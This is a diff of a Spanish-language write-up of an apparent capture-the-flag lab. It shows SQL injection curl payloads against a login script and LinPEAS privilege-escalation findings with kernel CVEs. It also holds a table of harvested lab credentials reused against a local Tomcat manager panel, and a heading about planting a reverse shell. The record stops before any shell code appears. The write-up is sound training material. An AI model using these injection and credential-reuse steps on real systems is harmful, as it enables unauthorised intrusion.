@@ -40,7 +40,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds
 ```
 
-Vemos que hay en el servidor Apache:
+Vemos que hay en el servidor Apache y quiero ver el contenido:
 
 ```
 curl http://172.17.0.2
@@ -308,7 +308,7 @@ curl -X POST -d "username=' OR '1'='1&password=123" http://172.17.0.2/db.php
 Consulta SQL: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '123'<br>
 ```
 
-Quiero inyectar un loguin donde la consulta SQL no tenga en cuenta la password
+Quiero inyectar un loguin donde la consulta SQL no tenga en cuenta el password
 
 ```bash
 curl -X POST -d "username=' OR '1'='1' -- -&password=irrelevante" http://172.17.0.2/db.php
@@ -719,7 +719,7 @@ Más específicamente me parecen interesantes las siguientes aplicaciones en el 
 - /etc/init.d/mysql: Script de inicialización para el servidor de base de datos MySQL. Vulnerabilidades en MySQL o configuraciones incorrectas podrían ser explotadas.
 - /etc/init.d/ssh: Script de inicialización para el servidor SSH. Vulnerabilidades en SSH o configuraciones incorrectas podrían ser explotadas.
 
-Según las guías, tomcat es vulnerable, entonces seguiré por ese lado... 
+Según las **guías**, tomcat es vulnerable, entonces seguiré por ese lado... 
 
 Veamos qué está corriendo en tomcat
 
@@ -815,7 +815,7 @@ cat /opt/tomcat/conf/tomcat-users.xml
 cat: /opt/tomcat/conf/tomcat-users.xml: Permission denied
 ```
 
-Bueno... siguiendo las guías, en el anterior comando vimos lo siguiente:
+Bueno... siguiendo las **guías**, en el anterior comando vimos lo siguiente:
 
 - start && service apache2 start && service tomcat start && service mysql start && while true; do /bin/bash /opt/alice/boss; done
 
@@ -845,7 +845,7 @@ Intentamos como los dicela guía con linpeas.sh que podemos detectar:
 
 - Configuraciones de servicios mal cerradas
 
-Vamos a servirle el archivo linpeas.sh a la víctima desde el usuario rosa, usando nuestro host como servidor.
+Vamos a servirle el archivo **linpeas.sh** a la víctima desde el usuario rosa, usando nuestro host como servidor.
 
 1. Descargamos el linpeas.sh
 
@@ -885,7 +885,7 @@ Ahora en nuestro usuario rosa:
    chmod +x linpeas.sh
    ```
 
-4. Ejecutamos el script
+4. Ejecutamos el **script**
 
    ```sh
    ./linpeas.sh
@@ -894,4 +894,135 @@ Ahora en nuestro usuario rosa:
 5. Resultados
 
    [linpeas_results.txt](./linpeas_result.txt)
+
+**Hallazgos**
+
+1. El proceso principal de root es:
+
+   ```sh
+   /bin/sh -c service ssh start && service apache2 start && service tomcat start && service mysql start && while true; do /bin/bash /opt/alice/boss; done
+   ```
+
+   El punto cítico para escalar es **/opt/alice/boss** 
+
+2. Hay un Tomcat corriendo en 127.0.0.1:8080, accesible sólo desde dentro del contenedor
+
+   ```sh
+   tcp6  0  0 127.0.0.1:8080 :::* LISTEN -
+   ```
+
+3. Apache corriendo como root y www-data
+
+   ```sh
+   /usr/sbin/apache2 -k start
+   ```
+
+4. Credenciales en memoria:
+
+   LinPEAS detectó procesos con credenciales potenciales en memoria:
+
+   - `tomcat`
+   - `mysql`
+   - `apache2`
+   - `sshd`
+
+5. Se detectan algunas vulnerabilidades:
+
+   1. `CVE-2022-2586` (nft_object UAF)
+   2. `CVE-2021-22555` (Netfilter heap overflow)
+
+## Subir una reverse shell desde el panel de administración de tomcat
+
+- Anteriormente tenemos como usuario y contraseña a:
+
+```sh
+| username   | password           |
+|------------|--------------------|
+| tomitoma   | alicelaultramejor  |
+| alice      | passwordinhack     |
+| rosa       | unbreackroot       |
+| admin      | badmenandwomen     |
+```
+
+- Vamos a probar acceso a tomcat con el usuario tomitoma
+
+```sh
+curl -u tomitoma:alicelaultramejor http://localhost:8080/manager/html
+```
+
+```html
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+ <head>
+  <title>401 Unauthorized</title>
+  <style type="text/css">
+    <!--
+    BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;font-size:12px;}
+    H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;}
+    PRE, TT {border: 1px dotted #525D76}
+    A {color : black;}A.name {color : black;}
+    -->
+  </style>
+ </head>
+ <body>
+   <h1>401 Unauthorized</h1>
+   <p>
+    You are not authorized to view this page. If you have not changed
+    any configuration files, please examine the file
+    <tt>conf/tomcat-users.xml</tt> in your installation. That
+    file must contain the credentials to let you use this webapp.
+   </p>
+   <p>
+    For example, to add the <tt>manager-gui</tt> role to a user named
+    <tt>tomcat</tt> with a password of <tt>s3cret</tt>, add the following to the
+    config file listed above.
+   </p>
+<pre>
+&lt;role rolename="manager-gui"/&gt;
+&lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
+</pre>
+   <p>
+    Note that for Tomcat 7 onwards, the roles required to use the manager
+    application were changed from the single <tt>manager</tt> role to the
+    following four roles. You will need to assign the role(s) required for
+    the functionality you wish to access.
+   </p>
+    <ul>
+      <li><tt>manager-gui</tt> - allows access to the HTML GUI and the status
+          pages</li>
+      <li><tt>manager-script</tt> - allows access to the text interface and the
+          status pages</li>
+      <li><tt>manager-jmx</tt> - allows access to the JMX proxy and the status
+          pages</li>
+      <li><tt>manager-status</tt> - allows access to the status pages only</li>
+    </ul>
+   <p>
+    The HTML interface is protected against CSRF but the text and JMX interfaces
+    are not. To maintain the CSRF protection:
+   </p>
+   <ul>
+    <li>Users with the <tt>manager-gui</tt> role should not be granted either
+        the <tt>manager-script</tt> or <tt>manager-jmx</tt> roles.</li>
+    <li>If the text or jmx interfaces are accessed through a browser (e.g. for
+        testing since these interfaces are intended for tools not humans) then
+        the browser must be closed afterwards to terminate the session.</li>
+   </ul>
+   <p>
+    For more information - please see the
+    <a href="/docs/manager-howto.html" rel="noopener noreferrer">Manager App How-To</a>.
+   </p>
+ </body>
+
+</html>
+```
+
+Tomcat está activo en /manager/html pero el usuario tomitoma no tiene el rol manager-gui, que es necesario para acceder al panel HTML.
+
+- Buscamos algún usuario con privilegios:
+
+  ```
+  
+  ```
+
+  
 
